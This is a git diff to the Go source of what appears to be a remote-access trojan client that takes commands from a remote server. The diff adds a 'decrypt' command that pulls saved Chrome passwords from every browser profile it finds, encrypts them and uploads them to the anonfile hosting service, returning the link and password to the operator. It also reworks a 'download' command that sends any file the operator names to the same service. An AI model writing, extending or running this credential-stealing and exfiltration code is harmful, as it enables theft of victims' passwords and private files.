@@ -1,13 +1,13 @@
 package main
 
 import (
+	"encoding/json"
 	"github.com/charmbracelet/log"
+	_ "github.com/mattn/go-sqlite3"
 	"github.com/wabarc/go-anonfile"
-	"io"
 	"net"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -21,16 +21,6 @@ func main() {
 		serverConn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 		if err != nil {
 			log.Errorf("Failed to connect to server: %v", err)
-			// Wait for a while before reconnecting
-			time.Sleep(time.Second * 5)
-			continue
-		}
-
-		// send data to server
-		_, err = serverConn.Write([]byte("Hello, server!"))
-		if err != nil {
-			log.Errorf("Failed to send data to server: %v", err)
-			_ = serverConn.Close()
 			// Wait for a while before reconnecting
 			time.Sleep(time.Second * 5)
 			continue
@@ -79,67 +69,87 @@ func ParseCommands(input string, conn net.Conn) {
 		var sb strings.Builder
 		sb.WriteString("Received files: \n")
 
-		dir, err := os.ReadDir(args[0])
+		dir, err := os.ReadDir(strings.Join(args, " "))
 		if err != nil {
 			SendResponse(conn, "Failed to read directory: "+err.Error())
 			return
 		}
 
 		for _, file := range dir {
-			sb.WriteString("Name: " + args[0] + file.Name() + ", IsFile: " + strconv.FormatBool(!file.IsDir()) + "\n")
+			sb.WriteString("Name: " + strings.Join(args, " ") + file.Name() + ", IsFile: " + strconv.FormatBool(!file.IsDir()) + "\n")
 		}
 
-		SendResponse(conn, sb.String())
+		SendResponse(conn, strings.TrimRight(sb.String(), "\n"))
 	} else if strings.HasPrefix(input, "download") {
 		args := ParseArgs(input, "download")
+		originalFile := args[0]
 
-		file := UploadFile(args[0])
+		var split []string
+		if strings.Contains(originalFile, "/") {
+			split = strings.Split(originalFile, "/")
+		} else {
+			split = strings.Split(originalFile, "\\")
+		}
+
+		tempFile := CreateTempFile(split[len(split)-1])
+		CopyFile(originalFile, tempFile)
+
+		file := UploadFile(tempFile.Name())
+		CloseFile(tempFile)
+		_ = os.Remove(tempFile.Name())
+
 		SendResponse(conn, file)
+	} else if strings.HasPrefix(input, "decrypt") {
+		args := ParseArgs(input, "decrypt")
+		_ = args[0] // TODO
+
+		localStatePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
+		defaultChromePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data"
+
+		localState, stateDirPath := CreateTempAndCopyFile(localStatePath)
+
+		var profiles []string
+		if CheckFileExist(defaultChromePath + "\\Default") {
+			profiles = append(profiles, "Default")
+		}
+
+		for i := 1; i < 6; i++ {
+			if CheckFileExist(defaultChromePath + "\\Profile " + strconv.Itoa(i)) {
+				profiles = append(profiles, "Profile "+strconv.Itoa(i))
+			}
+		}
+
+		data := DecryptLoginData(profiles, localState)
+
+		_ = os.Remove(localState)
+		_ = os.Remove(stateDirPath)
+
+		marshal, _ := json.Marshal(data)
+		password := RandomString(32)
+		encryptData, _ := EncryptData(marshal, password)
+
+		file := CreateTempFile("LoginData")
+		_, err := file.Write(encryptData)
+		if err != nil {
+			log.Errorf("Failed to write encrypted data to file: %v", err)
+		}
+
+		uploadFile := UploadFile(file.Name())
+
+		CloseFile(file)
+		_ = os.Remove(file.Name())
+
+		SendResponse(conn, "Decrypted login data from chrome\nPassword: "+password+"\nURL: "+uploadFile)
 	}
 }
 
-func UploadFile(path string) string {
-	file := CreateTempAndCopyFile(path)
-
+func UploadFile(pathToFile string) string {
 	var content = ""
-	if data, err := anonfile.NewAnonfile(nil).Upload(file); err == nil {
-		content = path + " -> " + data.Data.File.URL.Full
+	if data, err := anonfile.NewAnonfile(nil).Upload(pathToFile); err == nil {
+		content = data.Data.File.URL.Full
 	}
-
-	_ = os.Remove(file)
 
 	return content
-}
-
-func CreateTempAndCopyFile(originalFilePath string) string {
-	// Create a temporary directory
-	tempDir, _ := os.MkdirTemp("", "temp")
-
-	// Generate a temporary file path
-	split := strings.Split(originalFilePath, "\\")
-	tempFilePath := filepath.Join(tempDir, split[len(split)-1])
-
-	// Open the original file
-	originalFile, _ := os.Open(originalFilePath)
-
-	defer func(originalFile *os.File) {
-		_ = originalFile.Close()
-	}(originalFile)
-
-	// Create the temporary file
-	tempFile, _ := os.Create(tempFilePath)
-	defer func(tempFile *os.File) {
-		_ = tempFile.Close()
-	}(tempFile)
-
-	// Copy the contents of the original file to the temporary file
-	_, _ = io.Copy(tempFile, originalFile)
-
-	// Close the original file
-	_ = originalFile.Close()
-	_ = tempFile.Close()
-
-	return tempFilePath
 }
 
 func ParseArgs(input string, command string) []string {
